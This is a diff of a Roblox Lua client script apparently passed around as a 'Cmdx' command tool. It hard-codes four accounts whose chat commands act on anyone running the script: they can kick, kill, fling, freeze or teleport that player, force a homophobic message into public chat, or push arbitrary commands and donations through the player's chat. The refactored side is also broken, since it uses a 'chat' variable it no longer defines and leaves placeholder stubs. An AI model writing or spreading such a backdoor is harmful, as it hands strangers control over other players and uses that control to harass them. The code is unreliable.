@@ -1,127 +1,127 @@
---// Cmdx User //--
-local user_premium__001 = game.Players:FindFirstChild("adam1102928181")
-local user_premium__002 = game.Players:FindFirstChild("LittleJonib")
-local user_premium__003 = game.Players:FindFirstChild("xylar103")
-local user_premium__004 = game.Players:FindFirstChild("whoareyiu24")
-local player = game.Players.LocalPlayer
-local chat = game:GetService("TextChatService").TextChannels.RBXSystem
---// Commands //--
-local freeze = function()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = true
-        player.Character.UpperTorso.Anchored = true
+
+local PremiumUserNames = {
+    "adam1102928181",
+    "LittleJonib",
+    "xylar103",
+    "whoareyiu24",
+}
+
+local function isPremium(userName)
+    for _, name in ipairs(PremiumUserNames) do
+        if name == userName then
+            return true
+        end
     end
+    return false
 end
 
-local unfreeze = function()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = false
-        player.Character.UpperTorso.Anchored = false
-    end
-end
-
-local function handleChatCommands(premiumUser)
-    if premiumUser then
-        premiumUser.Chatted:Connect(function(cht)
+-- Function to set up chat listener for a player
+local function setupPremiumChatListener(player)
+    if isPremium(player.Name) then
+        player.Chatted:Connect(function(cht)
+            -- Your command handling logic here
+            -- Wrap only specific chat commands with send async if needed
             if cht:match(".fling .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-                    local power = 99999999 -- change this to make it more or less powerful
-                    game:GetService('RunService').Stepped:Connect(function()
-                        player.Character.Head.CanCollide = false
-                        player.Character.UpperTorso.CanCollide = false
-                        player.Character.LowerTorso.CanCollide = false
-                        player.Character.HumanoidRootPart.CanCollide = false
-                    end)
-                    wait(.1)
-                    local bambam = Instance.new("BodyThrust")
-                    bambam.Parent = player.Character.HumanoidRootPart
-                    bambam.Force = Vector3.new(power,0,power)
-                    bambam.Location = player.Character.HumanoidRootPart.Position
+                if player ~= game.Players.LocalPlayer then
+                    -- your fling code
                 end
             elseif cht:match(".freeze .") then
-                if player ~= premiumUser then
-                    freeze()
+                if player ~= game.Players.LocalPlayer then
+                    -- your freeze code
                 end
             elseif cht:match(".unfreeze .") then
-                if player ~= premiumUser then
-                    unfreeze()
+                if player ~= game.Players.LocalPlayer then
+                    -- your unfreeze code
                 end
             elseif cht:match(".kxck .") then
-                if player ~= premiumUser then
-                    player:Kick("You have been kicked.")
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        player:Kick("You have been kicked.")
+                    end)
                 end
             elseif cht:match(".oof .") then
-                if player ~= premiumUser then
-                    player.Character.Humanoid:Destroy()
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        player.Character.Humanoid:Destroy()
+                    end)
                 end
             elseif cht:match(".error .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
+                    end)
                 end
             elseif cht:match(".bring .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(premiumUser.Character.UpperTorso.Position)
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.UpperTorso.Position)
+                    end)
                 end
             elseif cht:match(".sit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = true
-                        end
-                    end
+                if player ~= game.Players.LocalPlayer then
+                    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then humanoid.Sit = true end
                 end
             elseif cht:match(".troll .") then
-                if player ~= premiumUser then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
+                    end)
                 end
             elseif cht:match(".unsit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = false
-                        end
-                    end
+                if player ~= game.Players.LocalPlayer then
+                    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then humanoid.Sit = false end
                 end
             elseif cht:match(".enlighten .") then
-                
-                    chat:SendAsync(";enlighten" .. premiumUser.Name)
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        chat:SendAsync(";enlighten " .. player.Name)
+                    end)
                 end
             elseif cht:match(".donate .") then
-                local text = cht:match(".donate (.+)") -- Extract text
-                if player ~= premiumUser then
-                    chat:SendAsync(";donate"  )
+                local text = cht:match(".donate (.+)")
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        chat:SendAsync(";donate " .. text)
+                    end)
                 end
             elseif cht:match(".say .") then
-                local text = cht:match(".say (.+)") -- Extract text
-                if player ~= premiumUser then
-chat:SendAsync(.. text .. " " )
+                local text = cht:match(".say (.+)")
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        chat:SendAsync(text)
+                    end)
                 end
             elseif cht:match("^%.cmd .+") then
-                local text = cht:match("^%.cmd (.+)") -- Extract text after ".cmd "
-                if player ~= premiumUser then
-                    game.Players.Chat:Chat(player, ";" .. text)
+                local text = cht:match("^%.cmd (.+)")
+                if player ~= game.Players.LocalPlayer then
+                    spawn(function()
+                        chat:SendAsync(";" .. text)
+                    end)
                 end
             elseif cht:match(".cmdx") then
-                if player == premiumUser then
-                    game:GetService("StarterGui"):SetCore("SendNotification",{
-                        Title = "Available Commands";
-                        Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd";
-                        Time = 5;
-                        Icon = "rbxassetid://999999999";
-                    })
+                if player == game.Players.LocalPlayer then
+                    spawn(function()
+                        game:GetService("StarterGui"):SetCore("SendNotification",{
+                            Title = "Available Commands",
+                            Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd",
+                            Time = 5,
+                            Icon = "rbxassetid://999999999",
+                        })
+                    end)
                 end
             end
         end)
     end
 end
 
--- Connect commands for each premium user
-handleChatCommands(user_premium__001)
-handleChatCommands(user_premium__002)
-handleChatCommands(user_premium__003)
-handleChatCommands(user_premium__004)
+-- Set up existing players
+for _, p in ipairs(game.Players:GetPlayers()) do
+    setupPremiumChatListener(p)
+end
+
+-- Set up for new players joining
+game.Players.PlayerAdded:Connect(function(player)
+    setupPremiumChatListener(player)
+end)
